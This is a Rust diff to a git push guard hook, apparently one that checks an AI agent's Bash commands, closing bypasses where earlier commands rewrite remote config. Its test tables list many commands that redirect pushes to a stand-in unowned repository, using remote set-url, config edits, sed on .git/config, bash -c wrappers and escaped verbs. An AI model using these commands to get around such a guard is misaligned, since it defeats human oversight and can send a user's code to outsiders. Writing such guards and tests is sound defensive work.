@@ -98,15 +98,23 @@ fn resolve_push_url(work_dir: &str, explicit_remote: Option<&str>) -> PushUrlRes
         GitQuery::Failed => return PushUrlResolution::Failed,
         GitQuery::TimedOut => return PushUrlResolution::TimedOut,
     };
-    let tracking =
-        match git_command_detailed(work_dir, &["config", &format!("branch.{branch}.remote")]) {
-            GitQuery::Value(tracking) => tracking,
-            // No per-branch remote configured is a normal git state — same
-            // "origin" fallback as before.
-            GitQuery::Failed => "origin".to_string(),
+    // git's own order for where a bare push goes: `branch.<b>.pushRemote`,
+    // then `remote.pushDefault`, then `branch.<b>.remote`, then `origin`.
+    // Reading only `branch.<b>.remote` judged `origin` while git pushed to the
+    // remote either of the first two named (cadence-hooks#1156).
+    for key in [
+        format!("branch.{branch}.pushRemote"),
+        "remote.pushDefault".to_string(),
+        format!("branch.{branch}.remote"),
+    ] {
+        match git_command_detailed(work_dir, &["config", &key]) {
+            GitQuery::Value(remote) if !remote.is_empty() => return get_url(&remote),
+            // Not configured is a normal git state — try the next key.
+            GitQuery::Value(_) | GitQuery::Failed => {}
             GitQuery::TimedOut => return PushUrlResolution::TimedOut,
-        };
-    get_url(&tracking)
+        }
+    }
+    get_url("origin")
 }
 
 /// Classification of the explicit push target in `git push [flags] <target>`.
@@ -431,8 +439,7 @@ const MAX_PUSH_DIRECTORIES: usize = 4;
 /// probe timeout blocks here, unlike the main path: the number of directories is
 /// the command's to choose, the same reasoning as the push-loop arm.
 fn check_pushes_elsewhere(
-    command: &str,
-    cwd: &str,
+    pushes: &[cadence_hooks_core::push::PushInvocation],
     work_dir: &str,
     allowed_owners: &[AllowEntry],
     allowed_repos: &[AllowEntry],
@@ -440,7 +447,15 @@ fn check_pushes_elsewhere(
 ) -> Option<CheckResult> {
     use cadence_hooks_core::shell::{GitQuery, git_command_detailed};
 
-    let pushes = push_locations(command, cwd);
+    let timed_out = || {
+        CheckResult::block(
+            "🚫 git-guardrails: Push ownership check timed out\n   \
+             The git-probe deadline expired before a push's remote could be \
+             ownership-validated — failing closed so an unowned remote can't slip \
+             through.\n   \
+             Fix: run the push on its own, from its repository.",
+        )
+    };
     if pushes.iter().any(|push| push.repository_unresolved) {
         return Some(CheckResult::block(
             "🚫 git-guardrails: Cannot tell which repository this push runs in\n   \
@@ -453,24 +468,27 @@ fn check_pushes_elsewhere(
         ));
     }
 
-    // A `-c` global that rewrites the push URL (cadence-hooks#1131): git
-    // sends the push to the `-c` URL, while every probe below reads the
-    // repository's configured one.
+    // A `-c` global that rewrites the push URL (cadence-hooks#1131), or an
+    // earlier segment rewriting the remote config (cadence-hooks#1156): git
+    // sends the push where the new config says, while every probe below reads
+    // the repository's config as it is before the command runs.
     if pushes.iter().any(|push| push.destination_unreadable) {
         return Some(CheckResult::block(
             "🚫 git-guardrails: Cannot tell where this push goes\n   \
-             A `-c`/`--config-env` global rewrites the push URL in a way this guard \
-             cannot read: a `url.<base>.insteadOf`/`pushInsteadOf` rewrite, an \
-             `include.path`/`includeIf` file, a `--config-env` URL, or a URL built \
-             by the shell.\n   \
-             Fix: push to the URL directly, e.g. `git push <url> main`, or set the \
-             remote first with `git remote set-url`.",
+             A `-c`/`--config-env` global, or an earlier command in the same line, \
+             changes the push URL in a way this guard cannot read: a \
+             `url.<base>.insteadOf`/`pushInsteadOf` rewrite, an \
+             `include.path`/`includeIf` file, a `--config-env` URL, a URL built by \
+             the shell, a `git remote rename`/`set-url --delete`, an unset or \
+             removed remote section, or an edit of a git config file.\n   \
+             Fix: change the remote in one command, then push in the next, e.g. \
+             `git remote set-url origin <url>` and then `git push origin main`.",
         ));
     }
     // Judged as the same value named directly would be: a URL is
     // ownership-checked, and a local path (`/srv/x.git`) is not a remote to
     // own, exactly as `git push /srv/x.git main` falls back.
-    for push in &pushes {
+    for push in pushes {
         for url in &push.config_destinations {
             let url_shaped = host_and_repo_from_url(url).is_some() || looks_like_push_url(url);
             if url_shaped && !check_owner(url, allowed_owners, allowed_repos, extra_hosts) {
@@ -485,8 +503,58 @@ fn check_pushes_elsewhere(
         }
     }
 
+    // A remote a `-c remote.pushDefault=`/`branch.<b>.pushRemote=`/
+    // `branch.<b>.remote=` global, or an earlier config write, points a bare
+    // push at (cadence-hooks#1156). Judged as the same word named as the push's
+    // repository would be.
+    let mut named: Vec<(&str, &str)> = Vec::new();
+    for push in pushes {
+        for remote in &push.config_remotes {
+            let entry = (push.work_dir.as_str(), remote.as_str());
+            if !named.contains(&entry) {
+                named.push(entry);
+            }
+        }
+    }
+    if named.len() > MAX_PUSH_DIRECTORIES {
+        return Some(CheckResult::block(
+            "🚫 git-guardrails: too many push remotes to verify\n   \
+             Fix: run each push individually, e.g. `git push origin main`",
+        ));
+    }
+    for (dir, remote) in named {
+        let url = match classify_push_target(remote, &RemoteNames::of(dir)) {
+            PushTarget::Url(url) => url,
+            PushTarget::UnownableUrl(url) | PushTarget::Unresolvable { token: url, .. } => {
+                return Some(CheckResult::block(format!(
+                    "🚫 git-guardrails: Push target's owner cannot be determined\n   \
+                     Would push to: {url}\n   \
+                     Directory:     {dir}\n\n   \
+                     Push explicit: git push origin main"
+                )));
+            }
+            PushTarget::Named(remote) => match resolve_push_url(dir, Some(&remote)) {
+                PushUrlResolution::Url(url) => url,
+                PushUrlResolution::TimedOut => return Some(timed_out()),
+                PushUrlResolution::Failed => return Some(cannot_resolve(dir)),
+            },
+            // Neither a configured remote nor a URL: git reads it as a local
+            // path, exactly as `git push ./x main` would.
+            PushTarget::None => continue,
+        };
+        if !check_owner(&url, allowed_owners, allowed_repos, extra_hosts) {
+            return Some(CheckResult::block(unowned_message(
+                &url,
+                dir,
+                allowed_owners,
+                allowed_repos,
+                extra_hosts,
+            )));
+        }
+    }
+
     let mut elsewhere: Vec<(&str, Option<&str>)> = Vec::new();
-    for push in &pushes {
+    for push in pushes {
         let entry = (push.work_dir.as_str(), push.repository.as_deref());
         if push.work_dir != work_dir && !elsewhere.contains(&entry) {
             elsewhere.push(entry);
@@ -499,15 +567,6 @@ fn check_pushes_elsewhere(
         ));
     }
 
-    let timed_out = || {
-        CheckResult::block(
-            "🚫 git-guardrails: Push ownership check timed out\n   \
-             The git-probe deadline expired before a push's remote could be \
-             ownership-validated — failing closed so an unowned remote can't slip \
-             through.\n   \
-             Fix: run the push on its own, from its repository.",
-        )
-    };
     for (dir, repository) in elsewhere {
         match git_command_detailed(dir, &["rev-parse", "--git-dir"]) {
             GitQuery::Value(_) => {}
@@ -552,6 +611,28 @@ fn check_pushes_elsewhere(
     None
 }
 
+/// [`push_locations`] for the command being judged, walked at most once.
+/// Every caller passes the same verb-normalized command and start directory.
+#[derive(Default)]
+struct PushWalk(std::cell::OnceCell<Vec<cadence_hooks_core::push::PushInvocation>>);
+
+impl PushWalk {
+    fn of(&self, command: &str, cwd: &str) -> &[cadence_hooks_core::push::PushInvocation] {
+        self.0.get_or_init(|| push_locations(command, cwd))
+    }
+}
+
+/// The directory the command starts in: the payload's `cwd`, else the hook
+/// process's own.
+fn input_cwd(input: &HookInput) -> String {
+    input.cwd.clone().unwrap_or_else(|| {
+        std::env::current_dir()
+            .ok()
+            .and_then(|p| p.to_str().map(String::from))
+            .unwrap_or_else(|| ".".to_string())
+    })
+}
+
 /// The block for a push whose target git could not resolve in `work_dir`.
 fn cannot_resolve(work_dir: &str) -> CheckResult {
     CheckResult::block(format!(
@@ -570,11 +651,14 @@ impl Check for PushRemoteGuard {
     }
 
     fn run(&self, input: &HookInput) -> CheckResult {
-        let verdict = judge_push(input);
+        // One push walk per command, shared by the gate, the directory check
+        // and the nudge: each is a full walk of every child script.
+        let walk = PushWalk::default();
+        let verdict = judge_push(input, &walk);
         if verdict.outcome != cadence_hooks_core::Outcome::Allow || verdict.bypass.is_some() {
             return verdict;
         }
-        unverified_directory_nudge(input).unwrap_or(verdict)
+        unverified_directory_nudge(input, &walk).unwrap_or(verdict)
     }
 }
 
@@ -585,7 +669,7 @@ impl Check for PushRemoteGuard {
 /// nothing in the command names another repository, and scripts hold their
 /// checkout in a variable often enough that blocking would spend friction on
 /// correct work. The walk reads text only, so this costs no subprocess.
-fn unverified_directory_nudge(input: &HookInput) -> Option<CheckResult> {
+fn unverified_directory_nudge(input: &HookInput, walk: &PushWalk) -> Option<CheckResult> {
     let command = input.command()?;
     let command = GIT_PUSH_VERB.replace_all(command, "git push");
     if !mentions_push(&command) {
@@ -596,8 +680,9 @@ fn unverified_directory_nudge(input: &HookInput) -> Option<CheckResult> {
         .and_then(|p| p.to_str().map(String::from))
         .unwrap_or_else(|| ".".to_string());
     let cwd = input.cwd.as_deref().unwrap_or(&cwd_fallback);
-    let push = push_locations(&command, cwd)
-        .into_iter()
+    let push = walk
+        .of(&command, cwd)
+        .iter()
         .find(|push| push.directory_unverified && !push.repository_unresolved)?;
     Some(CheckResult::nudge(format!(
         "⚠️  git-guardrails: Push directory could not be verified\n   \
@@ -612,7 +697,7 @@ fn unverified_directory_nudge(input: &HookInput) -> Option<CheckResult> {
 
 /// The ownership verdict for one Bash command, before the
 /// [`unverified_directory_nudge`] pass.
-fn judge_push(input: &HookInput) -> CheckResult {
+fn judge_push(input: &HookInput, walk: &PushWalk) -> CheckResult {
     let Some(command) = input.command() else {
         return CheckResult::allow();
     };
@@ -632,7 +717,14 @@ fn judge_push(input: &HookInput) -> CheckResult {
     // a parse. Union, never replacement: the parse must only ever ADD
     // commands to judge.
     let push_segments = git_push_segments(command);
-    if push_segments.is_empty() && !command.contains("git push") {
+    // The push walk is the third leg of the union: it recurses into child
+    // scripts, so `bash -c 'git -C <dir> push origin main'` — no top-level
+    // push segment and no literal `git push` — still reaches the directory
+    // check below instead of allowing at this gate (cadence-hooks#1144).
+    if push_segments.is_empty()
+        && !command.contains("git push")
+        && walk.of(command, &input_cwd(input)).is_empty()
+    {
         return CheckResult::allow();
     }
 
@@ -740,8 +832,7 @@ fn judge_push(input: &HookInput) -> CheckResult {
     // the session's owned checkout while the push ran elsewhere. The
     // non-flat push walk follows each of those or says it cannot.
     if let Some(block) = check_pushes_elsewhere(
-        command,
-        cwd,
+        walk.of(command, cwd),
         &work_dir,
         &allowed_owners,
         &allowed_repos,
@@ -2235,6 +2326,234 @@ mod tests {
             ] {
                 let result = PushRemoteGuard.run(&make_bash_with_cwd(command, &cwd));
                 assert_eq!(result.outcome, want, "{command}");
+            }
+        });
+    }
+
+    // --- cadence-hooks#1156: config rewritten earlier in the same command ---
+
+    /// Every row runs from an owned checkout whose `evilr` remote points at
+    /// an unowned repository: `(command, outcome)`. Each Block row was ALLOW
+    /// on main, and each was measured against real git: with the unowned URL
+    /// swapped for a local bare repository, that repository received the push.
+    #[test]
+    fn a_push_is_judged_against_config_an_earlier_segment_writes() {
+        use cadence_hooks_core::Outcome::{Allow, Block};
+        let owned = checkout_with_origin("https://github.com/cameronsjo/x.git");
+        cadence_hooks_core::git_fixtures::git_in(
+            owned.path(),
+            &["remote", "add", "evilr", "https://github.com/evil/y.git"],
+        );
+        let cwd = owned.path().to_string_lossy().to_string();
+        with_env(&owners_only(), || {
+            for (command, outcome) in [
+                // The issue's three shapes.
+                (
+                    "git remote set-url --push origin https://github.com/evil/y && git push origin main",
+                    Block,
+                ),
+                (
+                    "git config remote.origin.pushurl https://github.com/evil/y ; git push origin main",
+                    Block,
+                ),
+                (
+                    "git remote add x https://github.com/evil/y; git push x main",
+                    Block,
+                ),
+                // Every scope and grammar of `git config`.
+                (
+                    "git config --global remote.origin.pushurl https://github.com/evil/y && git push origin main",
+                    Block,
+                ),
+                (
+                    "git config -f .git/config remote.origin.url https://github.com/evil/y && git push",
+                    Block,
+                ),
+                (
+                    "git config set remote.origin.pushurl https://github.com/evil/y && git push origin main",
+                    Block,
+                ),
+                ("git config remote.pushDefault evilr && git push", Block),
+                ("git config branch.main.pushRemote evilr && git push", Block),
+                ("git config branch.main.remote evilr && git push", Block),
+                // Writes whose result the text cannot show.
+                (
+                    "git config --global url.https://github.com/evil/.pushInsteadOf https://github.com/cameronsjo/ && git push origin main",
+                    Block,
+                ),
+                (
+                    "git config --unset remote.origin.pushurl && git push origin main",
+                    Block,
+                ),
+                (
+                    "git config --remove-section remote.origin && git push origin main",
+                    Block,
+                ),
+                ("git config -e && git push origin main", Block),
+                (
+                    "git remote rename evilr origin2 && git push origin main",
+                    Block,
+                ),
+                (
+                    "git remote set-url --delete --push origin x && git push origin main",
+                    Block,
+                ),
+                (
+                    "git remote set-url origin \"$U\" && git push origin main",
+                    Block,
+                ),
+                (
+                    "echo '[remote \"origin\"]' >> .git/config && git push origin main",
+                    Block,
+                ),
+                ("echo x | tee -a .git/config && git push origin main", Block),
+                (
+                    "sed -i s/cameronsjo/evil/ .git/config && git push origin main",
+                    Block,
+                ),
+                (
+                    "cd .git && echo x >> config && cd .. && git push origin main",
+                    Block,
+                ),
+                ("echo x>>.git/config && git push origin main", Block),
+                ("echo x>.git/config; git push", Block),
+                ("printf x>>~/.gitconfig && git push", Block),
+                (
+                    "seq 2 | xargs -I{} sh -c 'git push origin main; git remote set-url origin https://github.com/evil/y'",
+                    Block,
+                ),
+                (
+                    "watch -n1 'git push origin main; git remote set-url origin https://github.com/evil/y'",
+                    Block,
+                ),
+                // The write outlives the scope it ran in, and is seen through
+                // an escape.
+                (
+                    "(git remote set-url origin https://github.com/evil/y); git push origin main",
+                    Block,
+                ),
+                (
+                    "bash -c 'git remote set-url origin https://github.com/evil/y'; git push origin main",
+                    Block,
+                ),
+                (
+                    "echo $(git remote set-url origin https://github.com/evil/y) && git push origin main",
+                    Block,
+                ),
+                (
+                    "git re\\mote set-url origin https://github.com/evil/y && git push origin main",
+                    Block,
+                ),
+                // A loop or a function runs the push after a write that
+                // follows it in the text.
+                (
+                    "for i in 1 2; do git push origin main; git remote set-url origin https://github.com/evil/y; done",
+                    Block,
+                ),
+                (
+                    "f(){ git push origin main; }; git remote set-url origin https://github.com/evil/y; f",
+                    Block,
+                ),
+                // Controls.
+                ("git remote -v && git push origin main", Allow),
+                ("git config user.name x && git push origin main", Allow),
+                (
+                    "git config --get remote.origin.url && git push origin main",
+                    Allow,
+                ),
+                (
+                    "git config remote.origin.url && git push origin main",
+                    Allow,
+                ),
+                ("git config --list && git push origin main", Allow),
+                (
+                    "git config branch.main.merge refs/heads/main && git push",
+                    Allow,
+                ),
+                (
+                    "git remote add up https://github.com/cameronsjo/other && git push up main",
+                    Allow,
+                ),
+                (
+                    "git config set remote.origin.pushurl https://github.com/cameronsjo/z && git push origin main",
+                    Allow,
+                ),
+                (
+                    "git push -u origin main && git remote add upstream https://github.com/evil/lib",
+                    Allow,
+                ),
+                ("cat .git/config && git push origin main", Allow),
+                ("echo hi > out.log && git push origin main", Allow),
+                ("echo \"a>b\" && git push origin main", Allow),
+                ("git push origin main 2>&1 | tee log", Allow),
+                ("f(){ git push origin main; }; f", Allow),
+            ] {
+                let result = PushRemoteGuard.run(&make_bash_with_cwd(command, &cwd));
+                assert_eq!(result.outcome, outcome, "{command}: {:?}", result.message);
+            }
+        });
+    }
+
+    /// A `-c` override of the keys that pick which remote a bare push uses
+    /// (cadence-hooks#1156 comment), and the same keys already in the
+    /// repository's config, which the probe used to skip.
+    #[test]
+    fn a_bare_push_is_judged_against_the_remote_git_picks_for_it() {
+        use cadence_hooks_core::Outcome::{Allow, Block};
+        let owned = checkout_with_origin("https://github.com/cameronsjo/x.git");
+        cadence_hooks_core::git_fixtures::git_in(
+            owned.path(),
+            &["remote", "add", "evilr", "https://github.com/evil/y.git"],
+        );
+        let cwd = owned.path().to_string_lossy().to_string();
+        with_env(&owners_only(), || {
+            for (command, outcome) in [
+                ("git -c remote.pushDefault=evilr push", Block),
+                ("git -c branch.main.pushRemote=evilr push", Block),
+                ("git -c branch.main.remote=evilr push", Block),
+                (
+                    "git -c remote.pushDefault=https://github.com/evil/y push",
+                    Block,
+                ),
+                ("git -c remote.pushDefault=$R push", Block),
+                ("git -c remote.pushDefault=origin push", Allow),
+                ("git -c branch.main.remote=origin push", Allow),
+            ] {
+                let result = PushRemoteGuard.run(&make_bash_with_cwd(command, &cwd));
+                assert_eq!(result.outcome, outcome, "{command}: {:?}", result.message);
+            }
+            for key in ["remote.pushDefault", "branch.main.pushRemote"] {
+                cadence_hooks_core::git_fixtures::git_in(owned.path(), &["config", key, "evilr"]);
+                let result = PushRemoteGuard.run(&make_bash_with_cwd("git push", &cwd));
+                assert_eq!(result.outcome, Block, "{key}: {:?}", result.message);
+                cadence_hooks_core::git_fixtures::git_in(owned.path(), &["config", "--unset", key]);
+                let result = PushRemoteGuard.run(&make_bash_with_cwd("git push", &cwd));
+                assert_eq!(result.outcome, Allow, "{key} unset: {:?}", result.message);
+            }
+        });
+    }
+
+    /// cadence-hooks#1144 item 3: a push in a child script run somewhere
+    /// else, with no top-level push segment and no literal `git push`, was
+    /// allowed at the gate before the directory check ran.
+    #[test]
+    fn a_wrapped_push_in_another_repository_reaches_the_directory_check() {
+        use cadence_hooks_core::Outcome::{Allow, Block};
+        let owned = checkout_with_origin("https://github.com/cameronsjo/x.git");
+        let other = checkout_with_origin("https://github.com/evil/y.git");
+        let cwd = owned.path().to_string_lossy().to_string();
+        let other = other.path().to_string_lossy().to_string();
+        with_env(&owners_only(), || {
+            for (command, outcome) in [
+                ("bash -c 'git -C {other} push origin main'", Block),
+                ("sh -c \"git -C {other} push\"", Block),
+                ("f(){ git -C {other} push origin main; }; f", Block),
+                ("bash -c 'git -C . push origin main'", Allow),
+                ("bash -c 'echo push'", Allow),
+            ] {
+                let command = command.replace("{other}", &other);
+                let result = PushRemoteGuard.run(&make_bash_with_cwd(&command, &cwd));
+                assert_eq!(result.outcome, outcome, "{command}: {:?}", result.message);
             }
         });
     }
